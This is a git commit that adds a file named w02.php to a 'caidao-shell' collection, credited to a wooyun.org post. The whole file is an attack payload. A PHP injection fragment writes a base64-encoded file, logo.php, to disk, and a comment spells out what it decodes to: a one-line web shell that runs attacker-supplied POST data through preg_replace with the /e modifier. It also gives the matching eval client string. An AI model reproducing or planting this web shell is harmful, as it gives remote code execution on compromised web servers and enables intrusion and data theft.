c0cb6d364bfed885d1b6b461298f96bc91341698
tennc <tennc@126.com>
2016-07-16 17:58:14 +0800

    Create w02.php
    from : http://zone.wooyun.org/content/28453

---
+++ caidao-shell/w02.php
@@ -0,0 +1,7 @@
+{$phpinfo()'];file_put_contents(base64_decode('bG9nby5waHA='),base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgiL1tEYXRhYmFzZV0vZSIgLCRfUE9TVFtkYXRhXSwgImVycm9yIik7ID8+'));/*}
+
+/* logo.php
+<?php @preg_replace("/[Database]/e" ,$_POST[data], "error"); ?>
+<O>Data=@eval($_POST[data]);</O>
+data
+*/
